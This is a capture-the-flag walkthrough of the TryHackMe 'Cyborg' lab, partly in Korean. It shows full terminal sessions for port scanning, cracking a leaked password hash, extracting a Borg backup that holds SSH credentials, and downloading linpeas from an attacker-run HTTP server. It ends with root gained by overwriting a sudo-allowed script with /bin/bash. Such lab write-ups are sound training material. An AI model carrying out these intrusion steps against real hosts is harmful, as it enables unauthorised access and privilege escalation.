tryhackme/cyborg - easy

# Enumeration
nmap
```
┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ sudo nmap -p- --max-retries 1 -sS -Pn -n --open 10.10.54.133 -oA tcpAll                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-11 16:27 KST
Stats: 0:00:59 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 58.21% done; ETC: 16:29 (0:00:42 remaining)
Nmap scan report for 10.10.54.133
Host is up (0.29s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 101.96 seconds

┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ sudo nmap -p 22,80 -Pn -n --open -sV -sC --min-rate 2000 -sS 10.10.54.133 -oA tcpDetailed         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-11 16:30 KST
Nmap scan report for 10.10.54.133
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
```
## web enumeration
`/etc/squid/passwd` -> music_archive credentials infomation
```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

music_archive:squidward

```
`admin` -> admin information landing page
```
techername -> Alex
from United Kingdom
```
archive file download -> archive.tar
```
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
archive.tar  SysinternalsSuite.zip  V1Yh5ObQ.docx
                                                                                                                                                             
┌──(kali㉿kali)-[~/Downloads]
└─$ mv archive.tar ../tryhackme/cyborg

┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ file archive.tar     
archive.tar: POSIX tar archive (GNU)


┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ tar -xvf archive.tar    
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1

```

# vulnerability
gobuster
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.54.133/ -w /usr/share/dirb/wordlists/common.txt -t 20 | tee gobuster-80 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.54.133/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] [--> http://10.10.54.133/admin/]
/etc                  (Status: 301) [Size: 310] [--> http://10.10.54.133/etc/]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```
`/admin` directory brute frocing used gobuster
```

```


# hash-cracking
```
┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

Possible Hashs:
[+] MD5(APR)
--------------------------------------------------


┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ echo '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > music_archive.hash

┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt music_archive.hash 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (?)     
1g 0:00:00:00 DONE (2024-05-11 16:46) 2.173g/s 84730p/s 84730c/s 84730C/s 112806..samantha5
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

# archive more enumeration
download archive.tar -> search vulnerability -> exploit
```
# backup repository.
┌──(kali㉿kali)-[~/…/home/field/dev/final_archive]
└─$ cat README 
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/


┌──(kali㉿kali)-[~/…/dev/final_archive/data/0]
└─$ xxd 4 | head -2      
00000000: 424f 5247 5f53 4547 cd96 a01d 150a 0000  BORG_SEG........
00000010: 00d6 4de9 2b17 af86 41f8 4063 7019 69f4  ..M.+...A.@cp.i.

```

# borg
borgbackup은 중복을 제거하고 데이터를 안전하게 보관하기 위한 백업 프로그
```
# install
┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ sudo apt install borgbackup -y


┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ borg list ./home/field/dev/final_archive 
Enter passphrase for key /home/kali/tryhackme/cyborg/home/field/dev/final_archive: <squidward>
music_archive                        Tue, 2020-12-29 23:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]

┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ borg extract ./home/field/dev/final_archive::music_archive         
Enter passphrase for key /home/kali/tryhackme/cyborg/home/field/dev/final_archive: 


┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ cd home  
                                                                                                                                                             
┌──(kali㉿kali)-[~/tryhackme/cyborg/home]
└─$ ls
alex  field


┌──(kali㉿kali)-[~/…/cyborg/home/alex/Desktop]
└─$ cat secret.txt 
shoutout to all the people who have gotten to this stage whoop whoop!"


┌──(kali㉿kali)-[~/…/cyborg/home/alex/Documents]
└─$ cat note.txt        
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3


```
백업된 alex 계정을 가진 유저의 파일들이 들어있음.

# 초기 침투 - SSH
```
┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ ssh alex@10.10.54.133         
alex@10.10.54.133's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ cat user.txt 
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}


```

# 후속 정보 수집
linpeas.sh 사용
```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh


┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.54.133 - - [11/May/2024 17:33:57] "GET /linpeas.sh HTTP/1.1" 200 -


alex@ubuntu:/dev/shm$ wget http://10.8.59.204:1234/linpeas.sh
alex@ubuntu:/dev/shm$ ls
linpeas.sh  pulse-shm-1042387856  pulse-shm-1914943417  pulse-shm-2432205161  pulse-shm-713013118  pulse-shm-737546746
alex@ubuntu:/dev/shm$ chmod +x linpeas.sh | sh linpeas.sh | tee linpeas.output

...
-rwsr-xr-x 1 root root 134K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
...


alex@ubuntu:/dev/shm$ /usr/bin/sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```


# 권한상승
```
alex@ubuntu:~$ ls -al /etc/mp3backups/backup.sh 
-r-xr-xr-- 1 alex alex 1083 Dec 30  2020 /etc/mp3backups/backup.sh
alex@ubuntu:~$ chmod 777 /etc/mp3backups/backup.sh
alex@ubuntu:~$ echo "/bin/bash" > /etc/mp3backups/backup.sh
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh
root@ubuntu:~# id; whoami; ip a
uid=0(root) gid=0(root) groups=0(root)
root
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:74:e8:94:75:f7 brd ff:ff:ff:ff:ff:ff
    inet 10.10.54.133/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::74:e8ff:fe94:75f7/64 scope link 
       valid_lft forever preferred_lft forever


root@ubuntu:~# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
root@ubuntu:~# cd /root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt 
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```
